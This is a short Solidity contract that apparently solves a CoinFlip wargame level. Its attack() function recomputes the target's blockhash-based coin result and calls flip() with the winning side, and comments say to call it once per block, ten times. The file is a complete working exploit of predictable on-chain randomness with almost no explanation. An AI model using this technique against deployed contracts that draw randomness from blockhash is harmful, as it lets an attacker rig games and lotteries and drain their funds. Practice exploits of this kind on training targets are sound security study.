// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract Attack{

CoinFlip cf;
address instance= 0x5355c5A1E839FEeb2f48B7eb74D4053Fb9C87781;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

constructor(){
    cf= CoinFlip(instance); //refference to the target
}

function attack() public {

    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false; //here I get the correct side for each block

    cf.flip(side); //call the function with the correct side every time
}

//the attack function has to be called once per mined block 10 times
//if the attack() will be called twice for the same block the transaction will be reverted due to the condition in CoinFlip.flip()

}
